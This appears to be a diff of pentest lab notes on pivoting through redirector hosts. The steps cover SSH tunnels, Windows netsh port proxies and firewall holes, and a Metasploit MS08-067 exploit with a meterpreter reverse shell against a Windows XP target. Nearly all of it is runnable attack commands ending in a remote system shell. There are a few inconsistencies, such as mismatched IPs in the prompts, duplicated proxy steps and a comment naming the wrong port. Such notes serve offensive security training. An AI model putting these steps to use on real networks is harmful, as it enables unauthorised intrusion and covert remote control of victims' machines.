@@ -14,12 +14,16 @@ Estb. redirector - 1 hop thru Linux box - Estb. port proxy from Kali machine to 
    ---------          ---------          ---------
  192.168.0.110      192.168.0.130         X.X.X.X
 
-NOTE: *For the return path - ALL RETURN PORTS MUST BE THE SAME
-
 ON KALI VM - Terminal #1
+	root@kali > ssh student@192.168.0.130
+	
+student@192.168.0.130 > sudo nano /etc/ssh/sshd_config
+		*either uncomment, or add a line with “GatewayPorts Yes”*
+student@192.168.0.130 > exit
+
 root@kali > ssh student@192.168.0.130 -L 5445:X.X.X.X:445 -R 8080:0.0.0.0:8080
 
-ON KALI VM - Terminal #2 
+ON KALI VM - Terminal #2
 anybody@kali > msfconsole
 msf > use exploit/windows/smb/ms08_067_netapi
 msf(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
@@ -27,7 +31,7 @@ msf(ms08_067_netapi) > set RHOST 0.0.0.0
 msf(ms08_067_netapi) > set RPORT 5445
 msf(ms08_067_netapi) > set LHOST 192.168.0.130 (closest box to TGT)
 msf(ms08_067_netapi) > set LPORT 8080
-msf(ms08_067_netapi) > set TARGET <pick target based on recon>
+msf(ms08_067_netapi) > set TARGET 4 (if XP SP2)
 msf(ms08_067_netapi) > show options
 msf(ms08_067_netapi) > exploit
 
@@ -35,6 +39,7 @@ After exploiting, ensure you made it to the correct IP address
 meterpreter > ifconfig     (****should see IP =X.X.X.X)
 meterpreter > netstat -ano (verify your connections)
 meterpreter > shell-------->>>>>>  C:\Windows\System32>
+
 
 
 
@@ -52,14 +57,24 @@ Estb. redirector - 1 hop thru Windows box - Estb. proxy from Kali machine to end
 NOTE: *For the return path - ALL RETURN PORTS MUST BE THE SAME
 
 ON Windows 7 VM - Terminal #1
-C:\ > netsh interface portproxy show all
-C:\ > netsh interface portproxy reset all (if needed)
+# check to see if there are any other port proxies currently set up
+      C:\ > netsh interface portproxy show all
+      C:\ > netsh interface portproxy reset all (if needed)
+# Create a port proxy forwarding traffic from port 5445 to the target IP over port 445
+      C:\ > netsh interface portproxy add v4tov4 listenport=5445 connectport=445 connectaddress=X.X.X.X
+ # Create the return tunnel over port 8080 to the Kali box on port 8080
+      C:\ > netsh interface portproxy add v4tov4 listenport=8080 connectport=8080 connectaddress=192.168.0.110
+# Verify your connections took correctly
+      C:\ > netsh interface portproxy show all 
 
-C:\ > netsh interface portproxy add v4tov4 listenport=5445 listenaddress=0.0.0.0 connectport=445 connectaddress=X.X.X.X
+# Rather than turn off the Windows firewall entirely, poke a hole in it, inbound on port 5445 (so that Kali can connect to the portproxy)
+      C:\ > netsh advfirewall firewall add rule name="mal inbound 5445" dir=in action=allow protocol=TCP localport=5445
+# Create an inbound firewall rule for 8080 as well to catch the returning connection from the victim machine
+      C:\ > netsh advfirewall firewall add rule name="mal inbound 8080" dir=in action=allow protocol=TCP localport=8080
+# Finally, create a firewall rule to allow the outbound tunnel over 8080 to your Kali box.
+      C:\ > netsh advfirewall firewall add rule name="mal outbound" dir=out action=allow protocol=TCP localport=8080
 
-C:\ > netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=192.168.0.110
 
-C:\ > netsh interface portproxy show all (verify your connections took correctly)
 
 ON KALI VM - Terminal #2
 anybody@kali > msfconsole
@@ -82,6 +97,7 @@ meterpreter > shell -------->>>>>>  C:\Windows\System32>
 
 
 
+
 Estb. redirector - 2 hops
       Kali              Ubuntu              W7                 XP
    ---------          ---------          ---------          ---------
@@ -93,19 +109,40 @@ Estb. redirector - 2 hops
 NOTE: *For the return path - ALL RETURN PORTS MUST BE THE SAME
 
 ON KALI VM - Terminal #1
+	root@kali > ssh student@192.168.0.130
+	
+student@10.0.0.130 > sudo nano /etc/ssh/sshd_config
+		*either uncomment, or add a line with “GatewayPorts Yes”*
+	student@10.0.0.130 > exit
+
 root@kali > ssh student@192.168.0.130 -L 5445:192.168.0.50:9050 -R 9051:0.0.0.0:9051
 
 ON Windows 7 VM - Terminal #1
-*To reset Netsh connections
-C:\ > netsh interface portproxy show all
-C:\ > netsh interface portproxy reset all (if needed)
+      C:\ > netsh interface portproxy add v4tov4 listenport=9050 listenaddress=0.0.0.0 connectport=445 connectaddress=X.X.X.X
 
-NOTE: Listen address is always 0.0.0.0
-C:\ > netsh interface portproxy add v4tov4 listenport=9050 listenaddress=0.0.0.0 connectport=445 connectaddress=X.X.X.X
+      C:\ > netsh interface portproxy add v4tov4 listenport=9051 listenaddress=0.0.0.0 connectport=9051 connectaddress=192.168.0.130
 
-C:\ > netsh interface portproxy add v4tov4 listenport=9051 listenaddress=0.0.0.0 connectport=9051 connectaddress=192.168.0.130
+# check to see if there are any other port proxies currently set up
+      C:\ > netsh interface portproxy show all
+      C:\ > netsh interface portproxy reset all (if needed)
 
-C:\ > netsh interface portproxy show all (verify your connections took correctly)
+# Create a port proxy forwarding traffic from port 5445 to the target IP over port 445
+      C:\ > netsh interface portproxy add v4tov4 listenport=9050 connectport=445 connectaddress=X.X.X.X
+
+# Create the return tunnel over port 8080 to the Kali box on port 9051
+      C:\ > netsh interface portproxy add v4tov4 listenport=9051 connectport=9051 connectaddress=192.168.0.130
+
+# Verify your connections took correctly
+      C:\ > netsh interface portproxy show all 
+
+# Rather than turn off the Windows firewall entirely, poke a hole in it, inbound on port 5445 (so that Kali can connect to the portproxy)
+      C:\ > netsh advfirewall firewall add rule name="mal inbound 9050" dir=in action=allow protocol=TCP localport=9050
+
+# Create an inbound firewall rule for 9051 as well to catch the returning connection from the victim machine
+      C:\ > netsh advfirewall firewall add rule name="mal inbound 9051" dir=in action=allow protocol=TCP localport=9051
+
+# Finally, create a firewall rule to allow the outbound tunnel over 9051 to your Kali box.
+      C:\ > netsh advfirewall firewall add rule name="mal outbound" dir=out action=allow protocol=TCP localport=9051
 
 ON KALI VM - Terminal #2
 anybody@kali > msfconsole
